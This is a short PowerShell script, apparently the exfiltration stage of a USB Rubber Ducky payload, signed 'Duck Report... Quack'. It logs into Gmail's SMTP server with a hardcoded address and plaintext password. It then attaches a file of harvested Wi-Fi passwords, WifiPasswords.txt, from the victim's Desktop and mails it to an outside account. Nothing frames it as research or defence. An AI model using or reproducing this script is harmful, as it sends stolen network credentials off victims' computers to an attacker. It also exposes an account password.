$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('yvohdm@gmail.com', 'midmidyvo');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'yvohdm@gmail.com'
$ReportEmail.To.Add('yvohdm@gmail.com')
$ReportEmail.Subject = 'Duck Report'
$ReportEmail.Body = 'Attached is your duck report.... Quack' 
$file="$env:HOMEPATH\Desktop\WifiPasswords.txt"
Write-Host “Attaching File :- ” $file
$attachment = New-Object System.Net.Mail.Attachment –ArgumentList $file
$ReportEmail.Attachments.Add($attachment)
$SMTPInfo.Send($ReportEmail)
write-host "Mail Sent Successfully"